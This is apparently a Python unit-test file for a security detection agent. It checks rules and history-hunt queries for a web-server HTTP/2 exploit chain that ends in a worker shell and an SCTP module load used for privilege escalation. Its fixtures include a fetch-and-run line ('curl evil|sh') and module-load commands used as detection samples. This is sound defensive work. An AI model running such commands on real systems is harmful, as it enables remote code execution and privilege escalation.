#!/usr/bin/env python3
"""HTTP2ROOT / NGINX2Root coverage (CVE-2026-123007 / -123633 nginx, CVE-2026-119618 Apache mod_http2).

Two host-visible shadows of the chain:
  * the HTTP/2 RCE landing an attacker in a worker-level shell — already caught live by b-lin-server-shell;
    this pins the nginx/apache ancestry and the advisory-hunt sweep over recorded history, and
  * the SCTP kernel module loaded as the privilege-escalation enabler — `modprobe sctp` by NAME, which the
    generic b-lkm-load (insmod / path-modprobe only) deliberately does NOT catch, so b-sctp-lpe owns it.

Pure stdlib. Run from the repo root:  python3 -m unittest discover -s tests -v
"""
import os
import sqlite3
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402

SCTP_RULE = next(r for r in agent.BUILTIN_RULES if r["id"] == "b-sctp-lpe")
SRV_RULE = next(r for r in agent.BUILTIN_RULES if r["id"] == "b-lin-server-shell")


def _cmd_node(cmdline):
    return {"type": "process", "label": "x", "detail": {"cmdline": cmdline}}


def _anc_node(ancestry, label):
    return {"type": "process", "label": label, "detail": {"ancestry": ancestry, "label": label}}


class SctpLpeRule(unittest.TestCase):
    def test_module_is_priv_escalation(self):
        self.assertEqual(SCTP_RULE["mitre"], "T1068")
        self.assertEqual(SCTP_RULE["severity"], "high")

    def test_sctp_load_by_name_or_ko_is_caught(self):
        for cmd in ("modprobe sctp", "/sbin/modprobe sctp", "modprobe -a sctp sctp_diag",
                    "sudo modprobe sctp", "insmod /tmp/sctp.ko", "insmod ./sctp.ko"):
            self.assertTrue(agent.rule_node_matches(SCTP_RULE, _cmd_node(cmd)), "should flag: " + cmd)

    def test_unrelated_loads_and_lookalikes_do_not_fire(self):
        # other modules; and 'sctpscan'/'sctp' text without a modprobe/insmod verb must stay quiet.
        for cmd in ("modprobe nf_conntrack", "modprobe overlay", "insmod /lib/modules/6.1/foo.ko",
                    "sctpscan 10.0.0.0/24", "cat /proc/net/sctp/assocs"):
            self.assertFalse(agent.rule_node_matches(SCTP_RULE, _cmd_node(cmd)), "should NOT flag: " + cmd)


class ServerShellNginxAncestry(unittest.TestCase):
    def test_nginx_and_apache_workers_spawning_a_shell_are_caught(self):
        for parent in ("nginx", "apache2", "httpd"):
            self.assertTrue(agent.rule_node_matches(SRV_RULE, _anc_node("systemd > %s" % parent, "bash")),
                            "%s > bash should match b-lin-server-shell" % parent)

    def test_nginx_without_a_shell_child_is_not_a_match(self):
        self.assertFalse(agent.rule_node_matches(SRV_RULE, _anc_node("systemd > nginx", "ls")))


class Http2RootAdvisoryHunts(unittest.TestCase):
    def setUp(self):
        self.adv = next(a for a in agent.ADVISORY_HUNTS if a["id"] == "http2root-nginx2root-2026-11")
        self.worker_shell_sql = self.adv["hunts"][0]["sql"]   # nginx/apache worker -> shell
        self.sctp_sql = self.adv["hunts"][1]["sql"]           # sctp module loaded / modprobe'd
        self.con = sqlite3.connect(":memory:")
        self.con.executescript(agent.HISTORY_SCHEMA)
        self.now = int(time.time())

    def _exec(self, eid, pid, ppid, exe, cmdline):
        self.con.execute(
            "INSERT INTO exec_events(id,ts,pid,ppid,exe,cmdline,uid,signing_id,platform,first_seen,last_seen)"
            " VALUES(?,?,?,?,?,?,?,?,?,?,?)",
            (eid, self.now, pid, ppid, exe, cmdline, 0, "", 1, self.now, self.now))

    def _proc(self, name, exe, ppid_name, cmdline=None):
        cols = {r[1] for r in self.con.execute("PRAGMA table_info(processes)")}
        vals = {"name": name, "exe": exe, "cmdline": cmdline or name, "user": "www",
                "ppid_name": ppid_name, "first_seen": self.now, "last_seen": self.now}
        vals = {k: v for k, v in vals.items() if k in cols}
        self.con.execute("INSERT INTO processes(%s) VALUES(%s)" % (",".join(vals), ",".join("?" * len(vals))),
                         tuple(vals.values()))

    def test_worker_shell_from_exec_history(self):
        # nginx worker -> bash, recorded in exec history (the HTTP/2 RCE landing)
        self._exec("e1", 100, 9, "/usr/sbin/nginx", "nginx: worker process")
        self._exec("e2", 101, 100, "/bin/bash", "bash -c 'curl evil|sh'")
        rows = self.con.execute(self.worker_shell_sql).fetchall()
        self.assertTrue(any("/bin/bash" in str(r) for r in rows))

    def test_worker_shell_from_live_process(self):
        # a shell whose live parent name is an apache worker
        self._proc("sh", "/bin/sh", "apache2")
        rows = self.con.execute(self.worker_shell_sql).fetchall()
        self.assertTrue(any("/bin/sh" in str(r) for r in rows))

    def test_worker_shell_no_false_positive(self):
        # a normal interactive shell running ls — parent is a shell, not a web worker
        self._exec("e3", 201, 9, "/bin/zsh", "zsh")
        self._exec("e4", 202, 201, "/bin/ls", "ls")
        rows = self.con.execute(self.worker_shell_sql).fetchall()
        self.assertFalse(any("/bin/ls" in str(r) for r in rows))

    def test_sctp_modprobe_in_history_is_caught(self):
        self._proc("modprobe", "/sbin/modprobe", "bash", cmdline="modprobe sctp")
        self.assertTrue(self.con.execute(self.sctp_sql).fetchall())

    def test_sctp_hunt_no_false_positive_on_other_modules(self):
        self._proc("modprobe", "/sbin/modprobe", "bash", cmdline="modprobe overlay")
        self.assertFalse(self.con.execute(self.sctp_sql).fetchall())


if __name__ == "__main__":
    unittest.main(verbosity=2)
